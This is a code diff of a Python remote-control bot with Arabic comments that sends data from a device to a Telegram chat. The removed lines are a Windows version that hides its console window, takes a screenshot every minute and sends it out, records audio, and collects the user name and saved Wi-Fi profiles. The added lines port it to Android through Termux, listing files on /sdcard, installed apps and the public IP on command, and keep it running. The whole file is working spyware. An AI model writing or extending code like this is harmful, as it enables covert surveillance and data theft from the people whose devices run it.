+<b>🕐 الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+"""
+            self.bot.send_message(info, chat_id)
+        except:
+            self.bot.send_message("❌ فشل الحصول على معلومات الجهاز", chat_id)
+
+    # ============================================
+    # 1️⃣2️⃣ إدارة الملفات
+    # ============================================
+    def list_files(self, chat_id, path='/sdcard'):
+        """عرض الملفات"""
+        try:
+            if os.path.exists(path):
+                files = os.listdir(path)[:20]
+                text = f"<b>📁 الملفات في: {path}</b>\n\n"
+
+                for i, file in enumerate(files, 1):
+                    full = os.path.join(path, file)
+                    if os.path.isdir(full):
+                        text += f"📁 {i}. {file}/\n"
+                    else:
+                        size = os.path.getsize(full) // 1024
+                        text += f"📄 {i}. {file} ({size} KB)\n"
+
+                self.bot.send_message(text[:4000], chat_id)
+            else:
+                self.bot.send_message("❌ المسار غير موجود", chat_id)
+        except:
+            self.bot.send_message("❌ فشل قراءة الملفات", chat_id)
+
+    # ============================================
+    # 1️⃣3️⃣ IP العام
+    # ============================================
+    def get_public_ip(self, chat_id):
+        """الحصول على IP العام"""
+        try:
+            ip = requests.get('https://api.ipify.org', timeout=10).text
+            self.bot.send_message(f"<b>🌐 IP العام:</b> {ip}", chat_id)
+        except:
+            self.bot.send_message("❌ فشل الحصول على IP", chat_id)
+
+    # ============================================
+    # 1️⃣4️⃣ التطبيقات المثبتة
+    # ============================================
+    def get_installed_apps(self, chat_id):
+        """عرض التطبيقات المثبتة"""
+        try:
+            result = subprocess.run(['pm', 'list', 'packages', '-3'],
+                                    capture_output=True, text=True, timeout=10)
+
+            if result.stdout:
+                apps = result.stdout.strip().split('\n')
+                text = "<b>📲 التطبيقات المثبتة:</b>\n\n"
+                for i, app in enumerate(apps[:30], 1):
+                    package = app.replace('package:', '')
+                    text += f"{i}. {package}\n"
+                self.bot.send_message(text[:4000], chat_id)
+            else:
+                self.bot.send_message("❌ لا توجد تطبيقات", chat_id)
+        except:
+            self.bot.send_message("❌ فشل قراءة التطبيقات", chat_id)
 
     # ============================================
     # دوال مساعدة
     # ============================================
-    def get_local_ip(self):
+    def get_storage_total(self):
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            ip = s.getsockname()[0]
-            s.close()
-            return ip
+            stat = os.statvfs('/sdcard')
+            total = stat.f_blocks * stat.f_frsize / (1024 ** 3)
+            return f"{total:.1f} GB"
         except:
-            return "غير متوفر"
+            return "غير معروف"
 
-    def record_audio_only(self, filename, duration):
+    def get_storage_free(self):
         try:
-            sample_rate = 44100
-            recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2, dtype='float32')
-            sd.wait()
-            sf.write(filename, recording, sample_rate)
+            stat = os.statvfs('/sdcard')
+            free = stat.f_bavail * stat.f_frsize / (1024 ** 3)
+            return f"{free:.1f} GB"
         except:
-            pass
+            return "غير معروف"
 
-    def start_auto_tasks(self):
-        threading.Thread(target=self.auto_screenshot, daemon=True).start()
+    def get_help_text(self):
+        """نص المساعدة"""
+        return """
+<b>🤖 مساعدة البوت:</b>
 
-    def auto_screenshot(self):
-        while True:
-            try:
-                time.sleep(60)
-                self.capture_screenshot(send_to_bot=True)
-            except:
-                pass
+📌 <b>الأوامر المتاحة:</b>
+• 1-14: أرقام للتحكم
+• /start: بدء التشغيل
+• /help: عرض المساعدة
 
-    def stop_all_recordings(self):
-        self.camera_active = False
-        self.recording_video = False
-        self.recording_audio = False
-        if self.camera:
-            self.camera.release()
-            self.camera = None
-
-    def send_device_info_to_bot(self, chat_id=None):
-        try:
-            chat_id = chat_id or BOT_CHAT_ID
-            system_info = platform.uname()
-            cpu_percent = psutil.cpu_percent(interval=1)
-            memory = psutil.virtual_memory()
-            disk = psutil.disk_usage('/')
-
-            info = f"""
-<b>🔍 معلومات الجهاز:</b>
-
-<b>💻 النظام:</b>
-• الجهاز: {system_info.node}
-• النظام: {system_info.system} {system_info.release}
-• المعالج: {platform.processor()}
-
-<b>⚙️ الأداء:</b>
-• CPU: {cpu_percent}%
-• RAM: {memory.percent}%
-• DISK: {disk.percent}%
-
-<b>🌐 الشبكة:</b>
-• IP: {self.get_local_ip()}
-• المستخدم: {getpass.getuser()}
+⚠️ <b>ملاحظة:</b>
+يحتاج تطبيق Termux:API مثبت على الجهاز
 """
-            self.bot.send_message(info, chat_id)
-        except:
-            pass
-
-    def send_wifi_info_to_bot(self, chat_id=None):
-        try:
-            chat_id = chat_id or BOT_CHAT_ID
-            networks = []
-
-            if platform.system() == "Windows":
-                try:
-                    result = subprocess.run(
-                        ["netsh", "wlan", "show", "profiles"],
-                        capture_output=True,
-                        text=True,
-                        encoding='utf-8',
-                        creationflags=subprocess.CREATE_NO_WINDOW
-                    )
-
-                    lines = result.stdout.split('\n')
-                    for line in lines:
-                        if "All User Profile" in line or "كافة ملفات تعريف المستخدم" in line:
-                            parts = line.split(":")
-                            if len(parts) > 1:
-                                network = parts[1].strip()
-                                if network:
-                                    networks.append(network)
-                except:
-                    pass
-
-            if networks:
-                info = "<b>📶 شبكات الواي فاي المسجلة:</b>\n\n"
-                for i, network in enumerate(networks[:15], 1):
-                    info += f"{i}. {network}\n"
-                self.bot.send_message(info, chat_id)
-            else:
-                self.bot.send_message("📶 لا توجد شبكات مسجلة", chat_id)
-        except:
-            pass
 
 
-# المتغير العام
-recorder = None
-
-
-def run_hidden():
-    global recorder
-
-    # إخفاء نافذة الكونسول
-    try:
-        import ctypes
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-    except:
-        pass
-
-    # تثبيت المكتبات المطلوبة
-    try:
-        import win32com.client
-    except:
-        os.system('pip install pywin32')
-        import win32com.client
-
-    recorder = DeviceRecorder()
-
-    try:
-        while True:
-            time.sleep(60)
-    except KeyboardInterrupt:
-        pass
-
+# ============================================
+# تشغيل التطبيق
+# ============================================
+controller = None
 
 if __name__ == "__main__":
-    run_hidden()
+    controller = AndroidController()
+
+    # منع إغلاق التطبيق
+    while True:
+        time.sleep(60)
